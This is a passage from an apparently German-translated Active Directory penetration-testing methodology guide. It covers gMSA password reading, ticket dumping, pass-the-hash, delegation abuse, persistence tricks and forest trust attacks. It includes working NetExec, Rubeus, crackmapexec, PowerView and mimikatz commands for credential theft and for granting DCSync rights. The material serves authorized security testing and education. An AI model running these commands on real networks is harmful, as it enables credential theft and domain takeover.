Ein fehlgeschlagener Default-/NTLM-Bind macht diesen Befund **nicht** ungültig: Teste mit `-k`, einem FQDN, der zum DC aufgelöst wird, und einer mit dem KDC synchronisierten Uhr. Erfolgreiche Modulläufe schreiben Kandidatenlisten und erworbene ccaches unter `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nachdem der Computer-Prinzipal kompromittiert wurde, ermittle seine verschachtelten Gruppenmitgliedschaften und ausgehenden Berechtigungen. Insbesondere können in einem Sicherheitsdeskriptor `msDS-GroupMSAMembership` einer gMSA aufgeführte Prinzipale `msDS-ManagedPassword` lesen; die Ausgabe von NetExecs `--gmsa` zeigt die berechtigten Prinzipale und gibt den aktuellen NT-Hash zurück, wenn der authentifizierende Computer dazu berechtigt ist.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Dann bewerte die wiederhergestellte gMSA wie jede andere Anmeldedaten: Prüfe lokale und Domänengruppenmitgliedschaften, Anmelderechte, SPNs, Delegation und erreichbare Dienste, bevor du pass-the-hash ausprobierst. Dieser ACL-basierte Abrufpfad unterscheidet sich von [Golden gMSA/dMSA](golden-dmsa-gmsa.md), bei dem verwaltete Passwörter nach einer Kompromittierung des KDS-Root-Keys abgeleitet werden.<sup>[[20]](#references)</sup>

Ein Computerprinzipal kann auch ausgehende Kontrolle über andere Computerobjekte oder Gruppen haben. Nachdem du eines erhalten hast, prüfe seine verschachtelten Mitgliedschaften und effektiven ACLs separat: Ein Schreibrecht für ein anderes Computerobjekt kann eine Kontoänderung ermöglichen, und Gruppenmitgliedschaftsrechte können zu einer Anmelderolle führen. Ein Kennzeichen für ein gestaffeltes Konto, eine vorhersehbare Namenskonvention oder eine `GenericWrite`-Kante allein beweist nicht den vollständigen Pfad.

Eine lesbare Kopie eines `msDS-ManagedPassword`-Blobs in einer Datei, Freigabe oder Sicherung ist ein separater Offenlegungspfad: Die LDAP-Lese-ACL kann eine anderswo gespeicherte Kopie nicht schützen. Verifiziere, dass es sich bei den Daten um ein Managed-Password-Blob handelt, bevor du sie interpretierst, und unterscheide dies sowohl von einem autorisierten LDAP-Lesezugriff als auch von einer Ableitung mithilfe des KDS-Root-Keys.

### Kerberoast

Beim Kerberoasting werden **TGS tickets** abgerufen, die von an Benutzerkonten gebundenen Diensten verwendet werden, und deren Verschlüsselung, die auf Benutzerpasswörtern basiert, **offline** geknackt.

Mehr dazu hier:


{{#ref}}
kerberoast.md
{{#endref}}

### Remoteverbindung (RDP, SSH, FTP, Win-RM usw.)

Sobald du einige Anmeldedaten erhalten hast, kannst du prüfen, ob du Zugriff auf einen **Rechner** hast. Dafür kannst du **CrackMapExec** verwenden, um anhand deiner Port-Scans mit verschiedenen Protokollen Verbindungen zu mehreren Servern herzustellen.

### Lokale Privilegieneskalation

Wenn du Anmeldedaten oder eine Sitzung als regulärer Domänenbenutzer kompromittiert hast und auf **einen beliebigen Rechner in der Domäne** zugreifen kannst, suche nach einem Weg, **lokal Privilegien zu eskalieren und Anmeldedaten zu sammeln**. Lokale Administratorrechte können es ermöglichen, **die Hashes anderer Benutzer** aus dem Arbeitsspeicher (LSASS) und dem lokalen Speicher (SAM) **zu dumpen**.

In diesem Buch gibt es eine vollständige Seite über die [**lokale Privilegieneskalation in Windows**](../windows-local-privilege-escalation/index.html) sowie eine [**Checkliste**](../checklist-windows-privilege-escalation.md). Vergiss auch nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Aktuelle Sitzungstickets

Es ist sehr **unwahrscheinlich**, dass du **Tickets** in der aktuellen Benutzersitzung findest, die dir **Zugriff auf** unerwartete Ressourcen **gewähren**, aber du kannst Folgendes prüfen:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Mit Domänenzugangsdaten oder einer Benutzersitzung solltest du NTLM [**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erneut untersuchen: Authentifizierte Enumeration und Coercion-Techniken können Relay-Pfade aufdecken, die bei der nicht authentifizierten Reconnaissance nicht verfügbar waren.

### Nach Zugangsdaten in Computerfreigaben | SMB-Freigaben suchen

Da du nun über einige grundlegende Zugangsdaten verfügst, solltest du prüfen, ob du **interessante Dateien finden kannst, die innerhalb der AD freigegeben sind**. Du kannst das manuell machen, aber es ist eine sehr langweilige und repetitive Aufgabe (besonders, wenn du Hunderte Dokumente findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über mögliche Tools zu erfahren.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM-Zugangsdaten stehlen

Wenn du **auf andere PCs oder Freigaben zugreifen** kannst, könntest du **Dateien platzieren** (zum Beispiel eine SCF-Datei), die bei einem Zugriff eine NTLM-Authentifizierung gegen dich ausl**ösen, sodass du die **NTLM-Challenge** stehlen und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten Benutzer, den **Domänencontroller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege Escalation in Active Directory MIT privilegierten Zugangsdaten/einer privilegierten Sitzung

**Für die folgenden Techniken reicht ein normaler Domänenbenutzer nicht aus. Du benötigst spezielle Berechtigungen/Zugangsdaten, um diese Angriffe auszuführen.**

### Hash-Extraktion

Hoffentlich ist es dir gelungen, mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oder einer [lokalen Privilege Escalation](../windows-local-privilege-escalation/index.html) ein lokales Administratorkonto zu **kompromittieren**.\
Dann ist es an der Zeit, alle Hashes aus dem Speicher und von lokalen Systemen zu dumpen.\
[**Lies diese Seite über verschiedene Möglichkeiten, die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du dich damit **als dieser Benutzer ausgeben**.\
Dazu benötigst du ein **Tool**, das die **NTLM-Authentifizierung mit** diesem **Hash durchführt**, **oder** du kannst eine neue **sessionlogon** erstellen und den **Hash** in **LSASS** **injizieren**, sodass dieser **Hash bei jeder NTLM-Authentifizierung verwendet wird**. Letzteres macht mimikatz.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern** – als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **in Netzwerken nützlich sein, in denen das NTLM-Protokoll deaktiviert ist** und als Authentifizierungsprotokoll nur **Kerberos zugelassen ist**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer ein Authentifizierungsticket eines Benutzers**, statt dessen Passwort oder Hashwerte. Dieses gestohlene Ticket wird dann dazu verwendet, sich **als der Benutzer auszugeben** und unautorisierten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Wiederverwendung von Zugangsdaten

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs** anzumelden.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Beachte, dass dies ziemlich **auffällig** ist und **LAPS** dem entgegenwirken würde.

### MSSQL-Missbrauch & vertrauenswürdige Links

Wenn ein Benutzer über Berechtigungen zum **Zugriff auf MSSQL-Instanzen** verfügt, könnte er damit **Befehle** auf dem MSSQL-Host **ausführen** (wenn die Instanz als SA läuft), den NetNTLM-**Hash stehlen** oder sogar einen **Relay-Angriff** durchführen.\
Wenn eine MSSQL-Instanz über einen Datenbanklink von einer anderen Instanz als vertrauenswürdig eingestuft wird, kann ein Benutzer mit Berechtigungen für die verknüpfte Datenbank möglicherweise **die Vertrauensbeziehung nutzen, um Abfragen auf der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen können verkettet werden und schließlich zu einer falsch konfigurierten Datenbank führen, auf der der Benutzer Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren auch über Forest-Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset-/Deployment-Plattformen

Inventarisierungs- und Deployment-Suites von Drittanbietern eröffnen oft weitreichende Möglichkeiten, an Zugangsdaten zu gelangen und Code auszuführen. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und über Domain-Berechtigungen auf dem Computer verfügst, kannst du die TGTs aller Benutzer aus dem Speicher auslesen, die sich am Computer anmelden.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du dessen TGT auslesen und dich mit [Pass the Ticket](pass-the-ticket.md) als dieser Benutzer ausgeben.\
Dank Constrained Delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für „Constrained Delegation“ zugelassen ist, kann er sich **als beliebiger Benutzer ausgeben, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash dieses Benutzers/Computers kompromittierst**, kannst du dich **als beliebiger Benutzer** (sogar als Domain Admin) **ausgeben**, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Mit **WRITE**-Berechtigungen für ein Active-Directory-Objekt eines Remote-Computers kann Code mit **erhöhten Berechtigungen** ausgeführt werden:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Missbrauch von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte über **interessante Berechtigungen für bestimmte Domain-Objekte** verfügen, die laterale Bewegung oder eine **Privilege Escalation** ermöglichen.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer-Spooler-Dienstes

Wird im Domain ein **lauschender Spool-Dienst** entdeckt, kann dieser **missbraucht** werden, um **neue Zugangsdaten zu erlangen** und **Berechtigungen zu erweitern**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, lassen sich möglicherweise **Zugangsdaten aus dem Speicher auslesen** und sogar **Beacons in ihre Prozesse injizieren**, um sich als diese Benutzer auszugeben.\
Benutzer greifen üblicherweise über RDP auf das System zu. Hier erfährst du, wie du ein paar Angriffe auf RDP-Sitzungen Dritter durchführst:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administratorpassworts** auf domain-verbundenen Computern. Dabei wird sichergestellt, dass das Passwort **randomisiert**, eindeutig und regelmäßig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert, und der Zugriff darauf wird über ACLs auf autorisierte Benutzer beschränkt. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter ist ein Pivot auf andere Computer möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Zertifikate vom kompromittierten Computer zu sammeln** kann eine Möglichkeit sein, die Berechtigungen innerhalb der Umgebung zu erweitern:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **verwundbare Templates** konfiguriert sind, lassen sie sich missbrauchen, um Berechtigungen zu erweitern:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation mit einem hochprivilegierten Konto

### Domain-Zugangsdaten auslesen

Sobald du **Domain Admin**- oder, noch besser, **Enterprise Admin**-Berechtigungen erlangt hast, kannst du die **Domain-Datenbank** _ntds.dit_ **auslesen**.

[**Weitere Informationen zum DCSync-Angriff findest du hier**](dcsync.md).

[**Weitere Informationen zum Stehlen der NTDS.dit findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Ein lesbares Backup-Archiv mit `ntds.dit` und der `SYSTEM`-Hive sollte bereits vor dem Entpacken als offengelegtes Verzeichnismaterial behandelt werden. Ein veralteter Passwort-Hash macht andere Objektattribute nicht sicher: Felder wie `description` können Zugangsdaten oder operative Hinweise enthalten. Prüfe zuerst die Namen der Archivdateien und gib extrahierte Datenbankinhalte nicht in routinemäßigen Aufzählungsausgaben aus.

### Privesc als Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Zum Beispiel könntest du:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Mache Benutzer anfällig für [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- [**DCSync**](#dcsync)-Berechtigungen einem Benutzer gewähren

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Der **Silver Ticket-Angriff** erstellt mithilfe des **NTLM-Hashes** (zum Beispiel des **Hashes des PC-Kontos**) ein **gültiges Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst. Mit dieser Methode lassen sich **die Berechtigungen des Dienstes nutzen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden Ticket-Angriff** verschafft sich ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active Directory (AD)-Umgebung. Dieses Konto ist speziell, da es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung im AD-Netzwerk erforderlich sind.

Sobald der Angreifer diesen Hash erlangt hat, kann er **TGTs** für beliebige Konten erstellen (Silver Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese ähneln Golden Tickets, werden aber so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistenz mit Kontozertifikaten**

**Zertifikate eines Kontos zu besitzen oder sie anfordern zu können** ist eine sehr gute Möglichkeit, im Benutzerkonto dauerhaft Zugriff zu behalten (auch wenn der Benutzer sein Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistenz mit Domänenzertifikaten**

**Zertifikate können auch verwendet werden, um sich mit hohen Berechtigungen innerhalb der Domäne dauerhaft Zugriff zu sichern:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder-Gruppe

Das **AdminSDHolder**-Objekt in Active Directory schützt **privilegierte Gruppen** (wie Domain Admins und Enterprise Admins), indem es für diese Gruppen eine einheitliche **Access Control List (ACL)** anwendet, um unbefugte Änderungen zu verhindern. Diese Funktion lässt sich jedoch ausnutzen: Ändert ein Angreifer die ACL von AdminSDHolder so, dass ein gewöhnlicher Benutzer Vollzugriff erhält, bekommt dieser Benutzer weitreichende Kontrolle über alle privilegierten Gruppen. Diese Schutzmaßnahme kann sich somit ins Gegenteil verkehren und unberechtigten Zugriff ermöglichen, wenn sie nicht sorgfältig überwacht wird.

[**Weitere Informationen zur AdminDSHolder-Gruppe gibt es hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM-Anmeldedaten

Auf jedem **Domain Controller (DC)** gibt es ein **lokales Administratorkonto**. Wer Administratorrechte auf einem solchen Computer erlangt, kann den Hash des lokalen Administrators mit **mimikatz** auslesen. Anschließend ist eine Änderung der Registrierung erforderlich, um **die Verwendung dieses Passworts zu aktivieren** und so remote auf das lokale Administratorkonto zuzugreifen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL-Persistenz

Du kannst einem **Benutzer** bestimmte **Sonderberechtigungen** für bestimmte Domänenobjekte **erteilen**, mit denen der Benutzer **später seine Berechtigungen erweitern kann**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Sicherheitsdeskriptoren

**Sicherheitsdeskriptoren** speichern die **Berechtigungen**, die ein **Objekt** für ein anderes **Objekt** hat. Schon eine **kleine Änderung** am **Sicherheitsdeskriptor** eines Objekts kann dir sehr interessante Berechtigungen für dieses Objekt verschaffen, ohne dass du Mitglied einer privilegierten Gruppe sein musst.


{{#ref}}
security-descriptors.md
{{#endref}}

### Anti-Forensik / Umgehung mit dynamischen Objekten

Missbrauche die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Sie löschen sich selbst, ohne Tombstones zu hinterlassen, und beseitigen LDAP-Beweise, während verwaiste SIDs, ungültige `gPLink`-Verweise oder zwischengespeicherte DNS-Antworten zurückbleiben (z. B. Verunreinigung der AdminSDHolder-ACEs oder bösartige Weiterleitungen über `gPCFileSysPath`/integriertes AD-DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Arbeitsspeicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domänenkonten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Hier erfährst du, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die **Anmeldedaten**, mit denen auf den Computer zugegriffen wird, im **Klartext** abzufangen.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dabei wird ein **neuer Domain Controller** im AD registriert und dazu verwendet, **Attribute** (SIDHistory, SPNs...) für bestimmte Objekte zu **setzen**, ohne **Protokolle** zu den **Änderungen** zu hinterlassen. Dafür benötigst du **DA**-Berechtigungen und musst dich in der **Stammdomäne** befinden.\
Beachte, dass bei falschen Daten ziemlich unschöne Protokolleinträge entstehen.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS-Persistenz

Wir haben zuvor besprochen, wie du Berechtigungen erweitern kannst, wenn du **über ausreichende Berechtigungen zum Lesen von LAPS-Passwörtern verfügst**. Diese Passwörter können jedoch auch verwendet werden, um **dauerhaft Zugriff zu behalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Berechtigungserweiterung in der Gesamtstruktur – Domänenvertrauensstellungen

Microsoft betrachtet die **Gesamtstruktur** als Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzelnen Domäne potenziell zur Kompromittierung der gesamten Gesamtstruktur führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Eine [**Domänenvertrauensstellung**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, über den ein Benutzer aus einer **Domäne** auf Ressourcen in einer anderen **Domäne** zugreifen kann. Im Wesentlichen verbindet sie die Authentifizierungssysteme der beiden Domänen und ermöglicht so einen nahtlosen Austausch von Authentifizierungsprüfungen. Wenn Domänen eine Vertrauensstellung einrichten, tauschen sie bestimmte **Schlüssel** aus und speichern diese auf ihren **Domain Controllern (DCs)**. Diese Schlüssel sind entscheidend für die Integrität der Vertrauensstellung.

Wenn ein Benutzer auf einen Dienst in einer **vertrauten Domäne** zugreifen möchte, muss er in einem typischen Szenario zunächst bei seinem eigenen Domänen-DC ein spezielles Ticket anfordern, das **Inter-Realm-TGT** genannt wird. Dieses TGT wird mit einem gemeinsamen **Schlüssel** verschlüsselt, auf den sich beide Domänen geeinigt haben. Anschließend legt der Benutzer dieses TGT dem **DC der vertrauten Domäne** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des Inter-Realm-TGT stellt der DC der vertrauten Domäne ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Ablauf**:

1. Ein **Clientcomputer** in **Domäne 1** startet den Vorgang, indem er seinen **NTLM-Hash** verwendet, um bei seinem **Domain Controller (DC1)** ein **Ticket Granting Ticket (TGT)** anzufordern.
2. Wenn der Client erfolgreich authentifiziert wurde, stellt DC1 ein neues TGT aus.
3. Anschließend fordert der Client bei DC1 ein **Inter-Realm-TGT** an, das für den Zugriff auf Ressourcen in **Domäne 2** benötigt wird.
4. Das Inter-Realm-TGT wird mit einem **Vertrauensschlüssel** verschlüsselt, den DC1 und DC2 im Rahmen der wechselseitigen Domänenvertrauensstellung gemeinsam verwenden.
5. Der Client übermittelt das Inter-Realm-TGT an den **Domain Controller von Domäne 2 (DC2)**.
6. DC2 überprüft das Inter-Realm-TGT mithilfe des gemeinsamen Vertrauensschlüssels und stellt bei erfolgreicher Prüfung ein **Ticket Granting Service (TGS)** für den Server in Domäne 2 aus, auf den der Client zugreifen möchte.
7. Schließlich legt der Client dem Server dieses TGS vor, das mit dem Hash des Serverkontos verschlüsselt ist, um Zugriff auf den Dienst in Domäne 2 zu erhalten.

### Verschiedene Vertrauensstellungen

Wichtig ist, dass eine **Vertrauensstellung unidirektional oder bidirektional** sein kann. Bei einer bidirektionalen Vertrauensstellung vertrauen sich beide Domänen gegenseitig. Bei einer **unidirektionalen** Vertrauensstellung ist eine Domäne die **vertraute** und die andere die **vertrauende** Domäne. In diesem Fall kannst du **nur von der vertrauten Domäne aus auf Ressourcen in der vertrauenden Domäne zugreifen**.

Wenn Domäne A Domäne B vertraut, ist A die vertrauende Domäne und B die vertraute. Außerdem handelt es sich in **Domäne A** um eine **ausgehende Vertrauensstellung** und in **Domäne B** um eine **eingehende Vertrauensstellung**.

**Verschiedene Vertrauensbeziehungen**

- **Parent-Child Trusts**: Diese häufige Konfiguration innerhalb derselben Gesamtstruktur gibt einer untergeordneten Domäne automatisch eine transitive bidirektionale Vertrauensstellung zu ihrer übergeordneten Domäne. Dadurch können Authentifizierungsanfragen nahtlos zwischen übergeordneter und untergeordneter Domäne übertragen werden.
- **Cross-link Trusts**: Diese auch als „Shortcut Trusts“ bezeichneten Vertrauensstellungen werden zwischen untergeordneten Domänen eingerichtet, um Verweisvorgänge zu beschleunigen. In komplexen Gesamtstrukturen müssen Authentifizierungsverweise normalerweise erst zur Stammstruktur der Gesamtstruktur und anschließend zur Zieldomäne übertragen werden. Cross-Links verkürzen diesen Weg, was besonders in geografisch verteilten Umgebungen von Vorteil ist.
- **External Trusts**: Diese Vertrauensstellungen werden zwischen verschiedenen, nicht miteinander verbundenen Domänen eingerichtet und sind nicht transitiv. Laut [Dokumentation von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind externe Vertrauensstellungen nützlich, um auf Ressourcen in einer Domäne außerhalb der aktuellen Gesamtstruktur zuzugreifen, die nicht über eine Gesamtstrukturvertrauensstellung verbunden ist. SID-Filtering erhöht bei externen Vertrauensstellungen die Sicherheit.
- **Tree-root Trusts**: Diese Vertrauensstellungen werden automatisch zwischen der Stammdomäne der Gesamtstruktur und einer neu hinzugefügten Stammstruktur eingerichtet. Sie kommen zwar nicht häufig vor, sind aber wichtig, um neue Domänenbäume zu einer Gesamtstruktur hinzuzufügen. So können diese einen eindeutigen Domänennamen beibehalten und wird eine bidirektionale Transitivität sichergestellt. Weitere Informationen findest du im [Leitfaden von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Vertrauensstellung ist eine bidirektionale, transitive Vertrauensstellung zwischen den Stammstrukturen zweier Gesamtstrukturen. Außerdem wird SID-Filtering eingesetzt, um die Sicherheit zu erhöhen.
- **MIT Trusts**: Diese Vertrauensstellungen werden mit Nicht-Windows-Kerberos-Domänen eingerichtet, die [RFC4120-konform](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind spezialisiert und eignen sich für Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Weitere Unterschiede bei **Vertrauensbeziehungen**

- Eine Vertrauensstellung kann **transitiv** (A vertraut B, B vertraut C, dann vertraut A auch C) oder **nicht transitiv** sein.
- Eine Vertrauensstellung kann **bidirektional** (beide vertrauen einander) oder **unidirektional** (nur eine Domäne vertraut der anderen) eingerichtet werden.

### Angriffsweg

1. **Ermittle** die Vertrauensbeziehungen.
2. Prüfe, ob ein **Sicherheitsprinzipal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domäne** hat, etwa über ACE-Einträge oder durch die Mitgliedschaft in Gruppen der anderen Domäne. Suche nach **domänenübergreifenden Beziehungen** (wahrscheinlich wurde die Vertrauensstellung genau dafür eingerichtet).
   1. In diesem Fall könnte Kerberoasting eine weitere Option sein.
3. **Kompromittiere** die **Konten**, über die sich ein **Pivot zwischen Domänen** durchführen lässt.

Angreifer, die auf Ressourcen in einer anderen Domäne zugreifen können, nutzen dafür hauptsächlich drei Mechanismen:

- **Mitgliedschaft in lokalen Gruppen**: Principals können lokalen Gruppen auf Computern hinzugefügt werden, zum Beispiel der Gruppe „Administrators“ auf einem Server. Dadurch erhalten sie weitreichende Kontrolle über diesen Computer.
- **Mitgliedschaft in Gruppen einer fremden Domäne**: Principals können auch Mitglied von Gruppen innerhalb der fremden Domäne sein. Wie wirksam diese Methode ist, hängt jedoch von der Art der Vertrauensstellung und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** aufgeführt sein, insbesondere als Einträge in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Wer mehr über die Funktionsweise von ACLs, DACLs und ACEs erfahren möchte, findet im Whitepaper „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ eine wertvolle Ressource.<sup>[[17]](#references)</sup>

### Externe Benutzer/Gruppen mit Berechtigungen finden

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um fremde Sicherheitsprinzipale in der Domäne zu finden. Dabei handelt es sich um Benutzer/Gruppen aus einer **externen Domäne/Gesamtstruktur**.

Du kannst dies in **Bloodhound** oder mit powerview überprüfen:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Privilegienausweitung vom Child- zum Parent-Forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Weitere Möglichkeiten, Domänenvertrauensstellungen zu enumerieren:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Es gibt **2 vertrauenswürdige Schlüssel**, einen für _Child --> Parent_ und einen für _Parent_ --> _Child_.\
> Den vom aktuellen Domain verwendeten Schlüssel kannst du mit Folgendem abrufen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise Admin zur Child-/Parent-Domain eskalieren, indem der Trust mit SID-History Injection ausgenutzt wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Beschreibbaren Configuration NC ausnutzen

Es ist wichtig zu verstehen, wie der Configuration Naming Context (NC) ausgenutzt werden kann. Der Configuration NC dient in Active Directory (AD)-Umgebungen als zentrales Repository für Konfigurationsdaten im gesamten Forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb des Forests repliziert, wobei beschreibbare DCs eine beschreibbare Kopie des Configuration NC verwalten. Um dies auszunutzen, benötigt man **SYSTEM-Rechte auf einem DC**, vorzugsweise einem Child DC.

**GPO mit der Root-DC-Site verknüpfen**

Der Sites-Container des Configuration NC enthält Informationen zu den Sites aller domain-verbundenen Computer innerhalb des AD-Forests. Mit SYSTEM-Rechten auf einem beliebigen DC können Angreifer GPOs mit den Root-DC-Sites verknüpfen. Dadurch kann die Root-Domain kompromittiert werden, indem Richtlinien manipuliert werden, die auf diese Sites angewendet werden.

